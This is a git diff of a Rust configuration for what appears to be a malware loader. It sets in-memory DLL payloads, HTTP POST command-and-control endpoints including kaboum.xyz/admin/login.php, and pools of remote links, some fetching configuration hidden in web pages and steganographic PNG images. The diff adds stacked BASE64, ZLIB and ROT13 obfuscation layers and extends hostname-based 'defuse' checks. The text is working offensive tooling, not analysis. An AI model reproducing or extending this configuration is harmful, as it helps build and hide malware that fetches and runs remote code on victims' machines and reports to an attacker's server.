@@ -205,7 +205,7 @@ exec(decoded_script)
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
-                memory_nb: 4,
+                memory_nb: 2,
                 dataoperation: payload_dataoperation,
                 jitt: 0,
                 sleep: 0,
@@ -298,10 +298,10 @@ exec(decoded_script)
                             sleep: 0,
                         }),*/
                         Link::HTTPPostC2(HTTPPostC2Link {
-                            url: String::from("http://192.168.56.1:3000/login.php"),
+                            url: String::from("http://127.0.0.1:3000/login.php"),
                             //dataoperation: vec![DataOperation::BASE64],
-                            dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
-                            dataoperation_post: vec![DataOperation::BASE64],
+                            dataoperation: vec![DataOperation::BASE64,DataOperation::ZLIB,DataOperation::BASE64,DataOperation::ROT13,DataOperation::BASE64],
+                            dataoperation_post: vec![DataOperation::BASE64,DataOperation::ZLIB,DataOperation::BASE64],
                             jitt: 0,
                             sleep: 0,
                         }),
@@ -318,11 +318,11 @@ exec(decoded_script)
         (
             1,
             (
-                "kaboum.xyz first links".to_string(),
+                "kaboum.xyz".to_string(),
                 PoolLinks {
                     pool_mode: PoolMode::ADVANCED(Advanced {
                         random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
-                        max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
+                        max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)   
                         parallel: true, // try to fetch every link in the same time, if not its one by one
                         linear: true,   // fetch link in the order or randomized
                         stop_same: false, // stop if found the same conf -> not for parallel
@@ -332,7 +332,7 @@ exec(decoded_script)
                     pool_links: vec![
                         Link::HTTP(HTTPLink {
                             url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
-                            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                            dataoperation: vec![DataOperation::WEBPAGE,DataOperation::ROT13, DataOperation::BASE64, DataOperation::ZLIB ],
                             jitt: 0,
                             sleep: 0,
                         }),
@@ -343,23 +343,18 @@ exec(decoded_script)
                             sleep: 0,
                         }),
                         Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/zzzlib"),
-                            dataoperation: vec![DataOperation::ZLIB],
-                            jitt: 0,
-                            sleep: 0,
-                        }),
-                        Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/troll1.png"),
+                            url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
                             dataoperation: vec![DataOperation::STEGANO],
                             jitt: 0,
                             sleep: 0,
                         }),
-                        Link::HTTP(HTTPLink {
-                            url: String::from("https://kaboum.xyz/artdonjon/troll2.png"),
-                            dataoperation: vec![DataOperation::STEGANO],
+                        Link::HTTPPostC2(HTTPPostC2Link {
+                            url: String::from("https://kaboum.xyz/admin/login.php"),
+                            dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
+                            dataoperation_post: vec![DataOperation::BASE64,DataOperation::ZLIB,DataOperation::BASE64],
                             jitt: 0,
                             sleep: 0,
-                        }),
+                        })
                     ],
                 },
             ),
@@ -372,7 +367,7 @@ exec(decoded_script)
                     pool_mode: PoolMode::SIMPLE,
                     pool_links: vec![Link::HTTP(HTTPLink {
                         url: String::from("https://kaboum.xyz/artdonjon/backup1.html"),
-                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                         jitt: 0,
                         sleep: 0,
                     })],
@@ -387,7 +382,7 @@ exec(decoded_script)
                     pool_mode: PoolMode::SIMPLE,
                     pool_links: vec![Link::HTTP(HTTPLink {
                         url: String::from("https://kaboum.xyz/artdonjon/backup2.html"),
-                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64, DataOperation::BASE64, DataOperation::ZLIB],
                         jitt: 0,
                         sleep: 0,
                     })],
@@ -417,7 +412,7 @@ exec(decoded_script)
         ],
         vec![
             Defuse::Hostname(Hostname {
-                list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
+                list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string() ,"Nidhogg".to_string(),"DESKTOP-SU97K9D".to_string()],
                 operator: Operator::OR,
             }),
             Defuse::DomainJoin(DomainJoin {
